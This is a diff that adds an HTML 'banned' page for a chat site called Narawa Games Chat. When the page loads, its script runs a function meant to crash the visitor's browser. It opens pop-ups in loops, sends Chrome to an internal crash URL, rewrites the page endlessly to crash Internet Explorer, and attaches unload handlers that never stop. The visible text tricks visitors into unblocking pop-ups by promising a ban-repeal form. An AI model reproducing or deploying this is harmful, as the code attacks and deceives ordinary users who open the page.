@@ -1,0 +1,180 @@
+<!doctype html>
+<html>
+	<head>
+		<title>Narawa Games Chat: BANNED!</title>
+		<script type="text/javascript" src="//code.jquery.com/jquery-latest.min.js"></script>
+		<link rel="stylesheet" type="text/css" href="../library/commonCore.css">
+		<style type="text/css">
+			.alert {
+				color: #ffaa88;
+			}
+			.alert, h1 {
+				font-weight: bold;
+				text-transform: uppercase;
+			}
+			html {
+				font-size: 1em;
+				margin: 0;
+				min-height: 100%;
+			}
+			html, body {
+				position: relative;
+				background: linear-gradient(to right, #333 0, #555 40%, #555 60%, #333 100%);
+				-webkit-box-sizing: border-box;
+				-moz-box-sizing: border-box;
+				box-sizing: border-box;
+			}
+			h1 {
+				margin: 2rem 0 1rem 0;
+				text-align: center;
+				font-size: 3.5rem;
+			}
+			p {
+				margin: 1rem 0;
+				line-height: 1.4;
+				text-indent: 3rem;
+			}
+			html body p:last-child {
+				margin: 1rem 0 0 0;
+			}
+			body {
+				margin: 3rem auto 0 auto;
+				padding: 200px 3rem 3rem 3rem;
+				font-size: 150%;
+				font-family: "Helvetica Neue", sans-serif;
+				color: white;
+				background-image: url("no.png");
+				background-position: center top;
+				background-repeat: no-repeat;
+				background-size: 150px 200px;
+				text-shadow: 0 1px black, 0 -1px black, 1px 0 black, -1px 0 black, 1px -1px black, -1px 1px black, -1px -1px black, 1px 1px black, 0 1px black, 0 2px #222, 0 3px #333;
+				max-width: 800px;
+			}
+		</style>
+		<script type="text/javascript">
+			var UA=navigator.userAgent;
+			var I=9999;
+			var supYo=[];
+			var chromeCrash="chrome://inducebrowsercrashforrealz";
+			var cIndex=UA.indexOf("Chrome");
+			var pth=window.location.pathname;
+			var pathFinder="https://narawagames.appspot.com/"+pth.slice(pth.indexOf("/")+1, pth.length);
+			supYo[0]=supYo;
+			function crashMyBrowserMuaHaHaHaHuagh(virusSignature) {
+				function memoryLeak() {
+					for (var X=I; X!=I; X+=I) {
+						I=I*X;
+					}
+				}
+				function annoy() {
+					alert("Too bad, your browser is dead by now!");
+					memoryLeak();
+				}
+				function openItUp(place) {
+					var D=new Date();
+					supYo=window.open(place, D.getTime(), config="height=0, width=0, toolbar=no, menubar=no, scrollbars=yes, resizable=yes, location=no, directories=no, status=yes");
+					if (typeof supYo!="undefined" && typeof supYo!="array" && typeof supYo.name!="undefined") {
+						supYo.focus();
+					}
+					else if (cIndex>=0) {
+						window.location=chromeCrash;
+					}
+				}
+				if (UA.indexOf("Gecko")>=0) {
+					openItUp(pathFinder);
+					memoryLeak();
+				}
+				else if (UA.indexOf("MSIE")>=0) {
+					while (true) {
+						document.getElementsByTagName("html")[0].innerHTML="\
+						<head> \
+							<style type=\"text/css\"> \
+							#a {margin:0 10px 10px;} \
+							#b {width:100%;} \
+							</style> \
+							<title>IE Crasher</title> \
+							</head> \
+							<body> \
+							<table><tr><td> \
+							<div id=\"a\"> \
+							<form id=\"b\"> \
+							<input type=\"text\" name=\"test\"/> \
+							</div> \
+							</td><td width=\"1\"></td></tr></table> \
+							</body>";
+						openItUp(pathFinder);
+					}
+					memoryLeak();
+				}
+				else {
+					function crash() {
+						while (true) {
+							openItUp(pathFinder);
+							for (var x in window) {
+								document.write(x);
+								annoy();
+							}
+							crash();
+						}
+					}
+					if (cIndex>=0) {
+						while (true) {
+							openItUp(chromeCrash);
+						}
+					}
+					memoryLeak();
+					while (true) {
+						window.addEventListener("unload", function () {
+							while (true) {
+								annoy();
+							}
+						});
+						window.addEventListener("pagehide", function () {
+							while (true) {
+								crash();
+							}
+						});
+					}
+				}
+			}
+			function getInfoBox() {
+				var information={user: "Fat-Idiot-Stinkhead", server: "Default"};
+				var parameters=window.location.search;
+				var len=parameters.length;
+				if (len>3) {
+					var amp=parameters.indexOf("&");
+					information.user=parameters.slice(3, amp);
+					information.server=parameters.slice(amp+3, len);
+				}
+				return information;
+			}
+			window.addEventListener("load", function () {
+				$.post("/post", {user: getInfoBox().user, message: "[ This user said a cuss / swear word, and he / she got banned! ]", server: getInfoBox().server}, function (data, state) {
+					crashMyBrowserMuaHaHaHaHuagh("jp6h58buW1Rn5jc43nAF");
+					/* THIS STATEMENT BLOCKS MEMORY LEAKAGE - [ return true; ] */
+				});
+				/* VIRUS SIGNATURE - [ jp6h58buW1Rn5jc43nAF! ] */
+			});
+		</script>
+	</head>
+	<body>
+		<script>
+			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+			ga('create', 'UA-46623054-1', 'auto');
+			ga('send', 'pageview');
+		</script>
+		<h1>You&apos;re Banned From Narawa Games Chat!</h1>
+		<p>
+			You likely sent a message before that contains a cuss word, hate speech, or other inappropriate language.
+		</p>
+		<p>
+			Your ban will be lifted in 12 hours. After that, you&apos;ll be able to send chat messages again!
+		</p>
+		<p class="alert">
+			NOTE: IF YOUR BROWSER SAYS &ldquo;POP&ndash;UP BLOCKED,&rdquo; UN&ndash;BLOCK THE POP&ndash;UP AND REFRESH THE PAGE. THAT POP&ndash;UP WILL HAVE A BAN REPEAL FORM TO REQUEST YOUR BAN TO BE LIFTED.
+		</p>
+	</body>
+</html>
